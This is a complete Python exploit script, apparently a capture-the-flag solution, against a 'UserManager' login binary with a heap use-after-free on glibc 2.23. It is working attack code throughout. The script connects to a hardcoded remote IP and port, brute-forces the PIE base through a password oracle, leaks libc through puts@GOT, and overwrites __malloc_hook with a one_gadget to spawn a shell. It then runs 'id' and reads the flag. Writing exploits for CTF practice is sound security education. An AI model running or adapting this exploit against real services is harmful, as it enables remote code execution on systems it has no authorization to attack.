#!/usr/bin/env python3
"""
PWN-UserManager Exploit
Target: glibc 2.23, Full RELRO, PIE, Canary, NX
Vuln: UAF (users[id] not cleared after Delete)

Struct (0x18 bytes, 0x20 chunk):
  [0x00] data ptr (overwritten by fastbin fd when freed)
  [0x08] func ptr = show (PRESERVED after fastbin free!)
  [0x10] size (PRESERVED after fastbin free!)

Attack:
  1. Register user 0,1 -> Delete user 0 -> UAF
  2. Register user 2 (pw=8) -> overlap: A as data, B as struct
  3. A[0:8]=pw(controlled), A[8:16]=show(preserved)
  4. Brute-force PIE via Login(2) password oracle
  5. Leak libc via puts@GOT
  6. Edit(0) to write one_gadget to __malloc_hook
  7. Trigger malloc -> shell
"""
import socket, time
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'
elf = ELF('./login')
libc = ELF('./libc-2.23.so')
HOST, PORT = '120.27.146.76', 21125

class Tube:
    def __init__(self):
        for i in range(20):
            try:
                self.s = socket.socket(); self.s.settimeout(10)
                self.s.connect((HOST, PORT)); time.sleep(0.3)
                self.b = self.s.recv(4096)
                if self.b and b'Menu' in self.b: return
                self.s.close()
            except: pass
            time.sleep(1)
        raise Exception("Cannot connect")
    def ru(self, d, to=10):
        end = time.time() + to
        while d not in self.b:
            self.s.settimeout(max(end - time.time(), 0.1))
            x = self.s.recv(4096)
            if not x: raise EOFError()
            self.b += x
        i = self.b.find(d) + len(d); r = self.b[:i]; self.b = self.b[i:]; return r
    def rl(self, to=10): return self.ru(b'\n', to)[:-1]
    def sn(self, d): self.s.sendall(d)
    def sl(self, d): self.sn(d + b'\n')
    def drain(self, to=0.5):
        self.s.settimeout(to)
        try:
            while True: self.b += self.s.recv(4096)
        except: pass
    def close(self): self.s.close()

def menu(t): t.ru(b'Your choice:')
def reg(t, i, l, p):
    menu(t); t.sl(b'2')
    t.ru(b'Input the user id:'); t.sl(str(i).encode())
    t.ru(b'Input the password length:'); t.sl(str(l).encode())
    t.ru(b'Input password:'); t.sn(p)
def delete(t, i):
    menu(t); t.sl(b'3')
    t.ru(b'Input the user id:'); t.sl(str(i).encode())
def edit(t, i, p):
    menu(t); t.sl(b'4')
    t.ru(b'Input the user id:'); t.sl(str(i).encode())
    t.ru(b'Input new pass:'); t.sn(p)
def login(t, i, l, p):
    menu(t); t.sl(b'1')
    t.ru(b'Input the user id:'); t.sl(str(i).encode())
    t.ru(b'Input the passwords length:'); t.sl(str(l).encode())
    t.ru(b'Input the password:'); t.sn(p)

def try_pie(t, show_addr):
    """Try a PIE candidate. Returns True if match."""
    sb = p64(show_addr)
    pw = b'\x01' * 8 + sb[:5]
    menu(t); t.sl(b'1'); t.ru(b'Input the user id:'); t.sl(b'2')
    t.ru(b'Input the passwords length:'); t.sl(b'13')
    t.ru(b'Input the password:'); t.sn(pw)
    t.drain(0.3)
    return b'success' in t.b

def exploit():
    t = Tube()
    log.info("Connected!")

    # Phase 1: Setup
    reg(t, 0, 0x18, b'A'*0x18)  # struct=A, data=B
    reg(t, 1, 0x18, b'B'*0x18)  # struct=C, data=D
    delete(t, 0)  # UAF: A->B->0 fastbin
    # users[0]=A(dangling), A->fd=B, A->p=show, A->size=0x18

    # Phase 2: Overlap
    reg(t, 2, 8, b'\x01'*8)  # A as data(8B write), B as struct
    # A[0:8]=pw, A[8:16]=show(preserved!), A[16:24]=0x18
    # users[2]=B, B->data=A, B->p=show, B->size=8
    log.info("Setup done!")

    # Phase 3: PIE Leak
    log.info("Leaking PIE...")
    pie_base = None

    # Common ASLR-off bases
    for b in [0x555555554000, 0x555555555000]:
        if try_pie(t, b + 0x9D0):
            pie_base = b; break

    # Brute-force 12-bit PIE entropy
    if pie_base is None:
        log.info("Brute-forcing PIE (12-bit entropy)...")
        for x in range(4096):
            b = 0x555555554000 + (x << 12)
            if try_pie(t, b + 0x9D0):
                pie_base = b
                log.success(f"Found! base={hex(b)} (x={x})")
                break
            if x % 256 == 0: log.info(f"Progress: {x}/4096")

    if pie_base is None:
        log.error("PIE leak failed!")
        t.close(); return

    t.b = b''  # Clear buffer
    log.success(f"PIE base: {hex(pie_base)}")

    # Phase 4: Libc Leak
    puts_got = pie_base + elf.got['puts']
    log.info(f"puts@GOT: {hex(puts_got)}")

    # Edit(2) sets A[0:8] = puts@GOT
    edit(t, 2, p64(puts_got)[:8])

    # Login(2): calls show(A). A[0:8]=p64(puts@GOT). puts prints A content.
    n = p64(puts_got).find(b'\x00')
    if n < 0: n = 8
    login(t, 2, n, p64(puts_got)[:n])
    t.ru(b'Login success!\n')
    libc_leak = t.rl(to=5)
    libc_puts = u64(libc_leak.ljust(8, b'\x00'))
    libc_base = libc_puts - libc.symbols['puts']
    log.success(f"Libc base: {hex(libc_base)}")

    # Phase 5: Overwrite __malloc_hook
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    one_gadget = libc_base + 0x4527a
    log.info(f"Overwriting __malloc_hook at {hex(malloc_hook)}")

    # Edit(2) sets A[0:8] = malloc_hook addr
    edit(t, 2, p64(malloc_hook)[:8])
    # users[0]->data = A[0:8] = malloc_hook. Edit(0) writes 24B to it!
    edit(t, 0, p64(one_gadget) + p64(0) * 2)
    log.success("__malloc_hook overwritten!")

    # Phase 6: Trigger shell
    log.info("Triggering shell via Register...")
    menu(t); t.sl(b'2')
    t.ru(b'Input the user id:'); t.sl(b'6')

    log.success("Shell spawned!")
    time.sleep(0.5)
    t.sl(b'id'); time.sleep(0.5); t.drain(1)
    print(t.b.decode(errors='ignore'))
    t.b = b''
    t.sl(b'cat /flag 2>/dev/null || cat flag 2>/dev/null')
    time.sleep(0.5); t.drain(1)
    print(t.b.decode(errors='ignore'))
    t.close()

if __name__ == '__main__':
    exploit()
